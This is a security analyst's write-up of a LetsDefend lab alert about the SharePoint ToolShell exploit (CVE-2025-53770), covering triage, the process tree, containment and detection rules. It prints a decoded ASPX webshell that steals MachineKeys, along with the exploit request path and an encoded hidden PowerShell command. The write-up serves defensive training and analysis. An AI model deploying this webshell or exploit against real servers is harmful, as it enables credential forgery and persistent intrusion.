# SOC342 | SharePoint Zero-Day (CVE-2025-53770)

**Platform:** LetsDefend  
**Date:** July 22, 2025  
**Alert Type:** Web Attack  
**Severity:** Critical  

---

## What Happened

Got a critical alert for a suspicious POST request hitting our SharePoint server. The request came from an external IP and targeted an internal admin endpoint (`ToolPane.aspx`) without any authentication. Device action was Allowed, meaning it went through.

The CVE tied to this is **CVE-2025-53770**, also called ToolShell. It's a zero-day in on-premises SharePoint that lets an unauthenticated attacker send a crafted request and get code execution on the server. No credentials needed, no user has to click anything.

---

## Alert Info

```
EventID         : 320
Time            : Jul 22, 2025 @ 01:07 PM
Host            : SharePoint01
Source IP       : 107.191.58.76
Destination     : 172.16.20.17
Method          : POST
URL             : /_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx
Referer         : /_layouts/SignOut.aspx
Content-Length  : 7699
Device Action   : Allowed
```

---

## Investigation

### Threat Intel First

Before touching logs I checked the source IP and CVE in the Threat Intel tab. Found two hits from OnlyHunt, both tagged CVE-2025-53770 and dated the same day as the attack: a hash and the IP `107.191.58.76`. That confirmed right away this wasn't a false alarm.

### Log Management

Searched logs for `107.191.58.76`. One result came back: a proxy log showing the POST request to ToolPane.aspx at exactly 01:07 PM. No scanning traffic before it, no failed attempts, just one clean hit. That tells me this was scripted and targeted, not someone manually poking around.

The referer header was set to `/_layouts/SignOut.aspx`. That's the attacker spoofing a signed-out session to trick the auth bypass logic. Combined with a 7699 byte payload, it matched the known exploit pattern for this CVE exactly.

### Endpoint | SharePoint01

Pulled up the process logs for SharePoint01 and sorted by time around 01:07 PM. Here's what the process tree looked like:

```
13:06:00  svchost.exe       parent: services.exe      [normal]
13:06:02  dnsapi.dll        parent: svchost.exe        [normal]
13:07:11  w3wp.exe          parent: services.exe       [IIS worker spins up]
13:07:24  powershell.exe    parent: w3wp.exe           [NOT normal]
13:07:27  csc.exe           parent: powershell.exe     [compiling something]
13:07:29  cmd.exe           parent: csc.exe            [executing it]
```

The first two are just normal Windows activity. Everything from 13:07:11 is the attack.

`w3wp.exe` is the IIS process that runs SharePoint. It should never be spawning PowerShell. Seeing that as a parent-child relationship is an immediate red flag. It means the web request was processed and code ran on the server.

The PowerShell command:

```
powershell.exe -nop -w hidden -e PCVAIEltcG9ydCBOYW1lc3BhY2U...
```

`-nop` skips the PowerShell profile to avoid restrictions. `-w hidden` runs it with no visible window. `-e` means the actual command is Base64 encoded so it's not immediately readable in logs.

### Decoding the Payload

Threw the Base64 string into CyberChef with a From Base64 operation. What came out was an ASPX webshell:

```csharp
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script runat="server" language="c#" CODEPAGE="65001">
    public void Page_load()
    {
        var sy = System.Reflection.Assembly.Load("System.Web, Version=4.0.0.0, 
            Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a");
        var mkt = sy.GetType("System.Web.Configuration.MachineKeySection");
        var gac = mkt.GetMethod("GetApplicationConfig", 
            System.Reflection.BindingFlags.Static | 
            System.Reflection.BindingFlags.NonPublic);
        var cg = (System.Web.Configuration.MachineKeySection)gac.Invoke(null, new object[0]);
        Response.Write(cg.ValidationKey+"|"+cg.Validation+"|"+
                       cg.DecryptionKey+"|"+cg.Decryption+"|"+cg.CompatibilityMode);
    }
</script>
```

This is using .NET Reflection to access a non-public method (`GetApplicationConfig`) and pull out SharePoint's MachineKeys. Specifically the `ValidationKey` and `DecryptionKey`.

Those keys are what SharePoint uses to sign and encrypt session tokens. If an attacker has them they can forge authentication cookies and log in as anyone, including farm admins, without knowing a single password. They can also use them to craft malicious ViewState payloads that trigger more RCE, so even if you remove the webshell, they still have a way back in until the keys are rotated.

Worth noting: my local antivirus blocked me from running the decode in PowerShell, which is actually a good sign. Means the payload is genuinely flagged as malicious by AV, not just suspicious.

---

## Attack Chain

```
01:07 PM  >>  POST to /_layouts/15/ToolPane.aspx (unauthenticated)
                        |
              CVE-2025-53770 auth bypass triggers
                        |
13:07:11  >>  w3wp.exe (IIS) processes the request
                        |
13:07:24  >>  w3wp.exe spawns powershell.exe -nop -w hidden
                        |
13:07:27  >>  PowerShell compiles ASPX webshell via csc.exe
                        |
13:07:29  >>  cmd.exe executes the compiled webshell
                        |
              MachineKeys stolen, persistent access established
```

---

## Containment

Isolated SharePoint01 through LetsDefend's endpoint containment. Host confirmed contained.

One thing I flagged separately: the last login on SharePoint01 was July 23, the day after the attack. That needs to be looked into to determine if it was a legitimate admin login or the attacker coming back using a forged token.

---

## Verdict

**True Positive. Server compromised.**

The attacker IP was already in threat intel tied to this exact CVE. The exploit request matched the known ToolShell pattern. Endpoint logs confirmed IIS spawned hidden PowerShell 17 seconds after the request landed. The decoded payload is a MachineKey-stealing webshell. Everything lines up.

---

## What Should Happen Next

- Rotate the MachineKeys immediately. ValidationKey and DecryptionKey should be treated as fully compromised
- Search SharePoint directories for any new `.aspx` files dropped around 13:07
- Investigate the July 23 login on SharePoint01
- Apply Microsoft's patch for CVE-2025-53770
- Block `107.191.58.76` at the perimeter
- Add a WAF rule to block unauthenticated POST requests to `/_layouts/` endpoints from external IPs
- Consider whether SharePoint admin paths should be accessible externally at all

---

## Detection Rules Worth Adding

- `w3wp.exe` spawning `powershell.exe`, `cmd.exe`, or `csc.exe` (should never happen)
- PowerShell with `-EncodedCommand` running under an IIS APPPOOL identity
- Unauthenticated POST to SharePoint `/_layouts/` from external IPs
- Large Content-Length (>5000) on requests to SharePoint admin endpoints

---

## Tools Used

- LetsDefend | triage, endpoint logs, log management, threat intel
- CyberChef | Base64 decode
- VirusTotal / AbuseIPDB | IP reputation

---

*Written by Shaheer A. Awan*
